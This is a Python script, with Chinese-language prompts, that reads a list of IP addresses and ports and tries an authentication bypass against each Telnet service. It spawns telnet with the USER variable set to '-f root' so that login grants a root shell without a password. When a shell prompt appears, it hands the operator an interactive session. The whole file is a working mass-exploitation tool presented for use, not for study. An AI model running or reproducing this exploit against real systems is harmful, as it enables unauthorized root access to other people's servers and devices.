#!/usr/bin/env python3
import os
import sys
import time
import socket
import pexpect

IP_FILE = "ip_list.txt"   
CONNECT_TIMEOUT = 7       
SESSION_TIMEOUT = 12      

def get_ips(filename):

    if not os.path.exists(filename):
        print(f"错误: 找不到文件 '{filename}'，请先创建该文件。")
        sys.exit(1)
    
    targets = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if ':' in line:
                        try:
                            ip, port = line.split(':')
                            targets.append((ip, int(port)))
                        except ValueError:
                            print(f"[!] 警告: 无法解析行 '{line}'，请确保格式为 ip:port")
                    else:
                        targets.append((line, 23))
    except Exception as e:
        print(f"读取文件失败: {e}")
        sys.exit(1)
    return targets

def check_connectivity(ip, port, timeout=7):
    """
    检测指定 IP 和端口的连通性
    """
    try:
        print(f"[*] 正在检测 {ip}:{port} 连通性...")
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except Exception:
        print(f"[-] 端口 {port} 未开放或无法触达: {ip}")
        return False

def run_telnet_session(ip, port):
    """
    建立 Telnet 会话
    """
    if not check_connectivity(ip, port, timeout=CONNECT_TIMEOUT):
        return

    command_str = f"env USER='-f root' telnet -a {ip} {port}"
    print(f"\n{'='*40}")
    print(f"正在尝试建立 Telnet 会话: {ip}:{port}")
    print(f"{'='*40}")

    try:
        child = pexpect.spawn(command_str, encoding='utf-8', timeout=SESSION_TIMEOUT)
        
        patterns = [
            "I don't hear you!",   # 0
            "login:",               # 1
            "Password:",           # 2
            "Username:",           # 3
            "#",                   # 4
            ">",                   # 5
            pexpect.TIMEOUT,       # 6
            pexpect.EOF            # 7
        ]

        index = child.expect(patterns)

        if index in [0, 1, 2, 3]:
            print(f"[-] 检测到登录/异常提示 '{patterns[index]}'，正在自动跳过...")
            child.close(force=True)
            return

        elif index in [4, 5]:
            print(f"[+] 连接成功!")
            print(">>> 进入交互模式! (退出请输入 'exit')")
            print("直接可执行系统命令即可（whoami等等）")
            child.interact()
            print(f"\n[*] 交互已结束。")

        elif index == 6:
            print(f"[-] 响应超时：在 {SESSION_TIMEOUT} 秒内未获得有效响应。")
            child.close(force=True)

        else:
            print(f"[-] 连接已意外中断 (EOF)。")
            child.close()

    except KeyboardInterrupt:
        print("\n\n[!] 用户中断脚本。")
        sys.exit(0)
    except Exception as e:
        print(f"[-] 运行出错: {e}")

def main():
    target_file = sys.argv[1] if len(sys.argv) > 1 else IP_FILE
    target_list = get_ips(target_file)
    
    if not target_list:
        print("文件中没有找到有效的目标（IP 或 IP:Port）。")
        return

    total = len(target_list)
    print(f"共加载 {total} 个目标，准备依次执行...")

    for index, (ip, port) in enumerate(target_list, 1):
        print(f"\n[ 进度: {index}/{total} ] 当前目标: {ip}:{port}")
        run_telnet_session(ip, port)
        
        time.sleep(1)

    print("\n[+] 任务清单处理完毕。")

if __name__ == "__main__":
    main()